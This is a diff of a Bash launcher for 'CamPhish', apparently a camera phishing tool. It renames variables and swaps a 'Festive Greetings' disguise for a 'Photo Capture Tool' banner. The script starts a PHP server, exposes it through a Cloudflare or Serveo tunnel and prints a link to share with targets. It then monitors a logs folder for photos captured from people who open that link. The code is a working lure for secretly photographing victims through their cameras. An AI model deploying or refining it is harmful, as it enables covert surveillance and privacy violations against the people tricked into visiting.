@@ -1,112 +1,118 @@
 #!/bin/bash
 
-# Colors for output
-red='\e[91m'
-green='\e[92m'
-yellow='\e[93m'
-cyan='\e[96m'
+# New color scheme
+purple='\e[35m'
+orange='\e[33m'
+blue='\e[34m'
+white='\e[97m'
 reset='\e[0m'
 
-# Check and install required packages
-echo -e "${yellow}[+] Checking & Installing required packages...${reset}"
-pkgs=(php openssh wget inotify-tools)
-for pkg in "${pkgs[@]}"; do
-    if ! command -v $pkg >/dev/null 2>&1; then
-        echo -e "${cyan}Installing $pkg...${reset}"
-        pkg install $pkg -y >/dev/null 2>&1
+# CamPhish ASCII Banner
+clear
+echo -e "${purple}========================================${reset}"
+echo -e "${white}  ______      ______      __      ${reset}"
+echo -e "${white} /      \    /      \    /  \     ${reset}"
+echo -e "${white}|  CamPhish |  CamPhish |  CamPhish ${reset}"
+echo -e "${white} ______/     ______/     __/      ${reset}"
+echo -e "${purple}========================================${reset}"
+echo -e "${blue}      Photo Capture Tool      ${reset}"
+echo -e "${purple}========================================${reset}"
+echo ""
+
+# Install dependencies
+echo -e "${orange}=== Installing Dependencies ===${reset}"
+dependencies=("php" "openssh" "wget" "inotify-tools")
+for dep in "${dependencies[@]}"; do
+    if ! command -v $dep >/dev/null 2>&1; then
+        echo -e "${blue}Installing $dep...${reset}"
+        pkg install $dep -y >/dev/null 2>&1
     fi
 done
 
-# Install cloudflared if not installed
+# Install cloudflared
 if ! command -v cloudflared >/dev/null 2>&1; then
-    echo -e "${cyan}Installing cloudflared...${reset}"
+    echo -e "${blue}Installing cloudflared...${reset}"
     pkg install cloudflared -y >/dev/null 2>&1
 fi
 
-# Display startup message
-clear
-echo -e "${cyan}--------------------------------------------${reset}"
-echo -e "${green}  Festive Greetings Web App${reset}"
-echo -e "${cyan}--------------------------------------------${reset}"
-echo ""
+# Redesigned tunnel selection menu
+echo -e "${orange}--- Select a Tunneling Method ---${reset}"
+echo -e "${blue}[1] Local Server (127.0.0.1:8080)${reset}"
+echo -e "${blue}[2] Cloudflare Tunnel (Public URL)${reset}"
+echo -e "${blue}[3] Serveo SSH Tunnel (Public URL)${reset}"
+echo -ne "${orange}Your selection (1-3) [default: 1]: ${reset}"
+read choice
+choice=${choice:-1}
 
-# Tunnel Menu
-echo -e "${yellow}[+] Choose Tunnel Option:${reset}"
-echo -e "${green}1) Localhost (default)${reset}"
-echo -e "${cyan}2) Cloudflared${reset}"
-echo -e "${red}3) Serveo.net (SSH Tunnel)${reset}"
-echo -ne "${yellow}Enter your choice [1-3]: ${reset}"
-read opt
-opt=${opt:-1}
+# Event name input
+echo -ne "${orange}\nEnter Event Name: ${reset}"
+read event
+event_slug=$(echo "$event" | tr '[:upper:]' '[:lower:]' | tr ' ' '-')
 
-# Festival Name
-echo -ne "${yellow}\nEnter Festival Name: ${reset}"
-read fest
-fest_slug=$(echo "$fest" | tr '[:upper:]' '[:lower:]' | tr ' ' '_')
+# Update event name in index.html
+sed -i "s|Capture a moment with this app!|Capture a moment with this app - $event!|g" index.html
 
-# Update festival name in index.html
-sed -i "s|Wishing you a joyful and prosperous celebration!|Wishing you a joyful and prosperous $fest celebration!|g" index.html
-
-# Start PHP Server
-echo -e "${yellow}\n[+] Starting PHP server on localhost:8080${reset}"
+# Start PHP server
+echo -e "${orange}\n=== Launching PHP Server on Port 8080 ===${reset}"
 mkdir -p logs
 killall php >/dev/null 2>&1
 php -S 127.0.0.1:8080 >/dev/null 2>&1 &
 sleep 3
 
-# Tunnel Setup
-link=""
-if [[ $opt == 2 ]]; then
-    echo -e "${yellow}[+] Starting Cloudflared tunnel...${reset}"
+# Tunnel configuration
+public_link=""
+if [[ $choice == 2 ]]; then
+    echo -e "${orange}=== Initiating Cloudflare Tunnel ===${reset}"
     killall cloudflared >/dev/null 2>&1
-    rm -f .clflog
-    cloudflared tunnel --url http://localhost:8080 > .clflog 2>&1 &
+    rm -f .cflog
+    cloudflared tunnel --url http://localhost:8080 > .cflog 2>&1 &
     sleep 5
 
-    echo -e "${yellow}[+] Fetching Cloudflared link...${reset}"
+    echo -e "${orange}=== Retrieving Cloudflare URL ===${reset}"
     for i in {1..15}; do
-        link=$(grep -o "https://[-0-9a-zA-Z.]*\.trycloudflare.com" .clflog | head -n1)
-        if [[ $link != "" ]]; then
+        public_link=$(grep -o "https://[-0-9a-zA-Z.]*\.trycloudflare.com" .cflog | head -n1)
+        if [[ $public_link != "" ]]; then
             break
         fi
         sleep 1
     done
 
-elif [[ $opt == 3 ]]; then
-    echo -e "${yellow}[+] Starting Serveo.net (SSH Tunnel)...${reset}"
+elif [[ $choice == 3 ]]; then
+    echo -e "${orange}=== Initiating Serveo SSH Tunnel ===${reset}"
     killall ssh >/dev/null 2>&1
-    rm -f .servolog
-    ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > .servolog 2>&1 &
+    rm -f .srvlog
+    ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > .srvlog 2>&1 &
     sleep 7
 
-    echo -e "${yellow}[+] Fetching public link from Serveo...${reset}"
+    echo -e "${orange}=== Retrieving Serveo URL ===${reset}"
     for i in {1..15}; do
-        link=$(grep -o "https://[a-z0-9.-]*\.serveo\.net" .servolog | head -n1)
-        if [[ $link != "" ]]; then
+        public_link=$(grep -o "https://[a-z0-9.-]*\.serveo\.net" .srvlog | head -n1)
+        if [[ $public_link != "" ]]; then
             break
         fi
         sleep 1
     done
 
-    if [[ $link == "" ]]; then
-        echo -e "${red}[-] Serveo tunnel failed. Try again later.${reset}"
+    if [[ $public_link == "" ]]; then
+        echo -e "${purple}!!! Serveo tunnel setup failed. Please try again later. !!!${reset}"
         exit 1
     fi
 else
-    link="http://localhost:8080"
+    public_link="http://localhost:8080"
 fi
 
-# Show Link
-echo -e "\n${cyan}[+] Share this link:${reset} ${green}$link${reset}"
+# Display the link
+echo -e "\n${blue}=== Public Link ===${reset}"
+echo -e "${white}$public_link${reset}"
 
-# Monitor Captured Images
-echo -e "\n${yellow}[+] Waiting for photo capture...${reset}"
+# Monitor for captured images
+echo -e "${orange}\n=== Monitoring for Captured Images ===${reset}"
 mkdir -p logs
-last_file=""
+previous_file=""
 while true; do
     new_file=$(inotifywait -e create --format '%f' logs 2>/dev/null)
-    if [[ "$new_file" != "$last_file" ]]; then
-        echo -e "${green}[+] Photo Captured:${reset} logs/$new_file"
-        last_file="$new_file"
+    if [[ "$new_file" != "$previous_file" ]]; then
+        echo -e "${blue}>>> Image Captured: logs/$new_file${reset}"
+        previous_file="$new_file"
     fi
 done
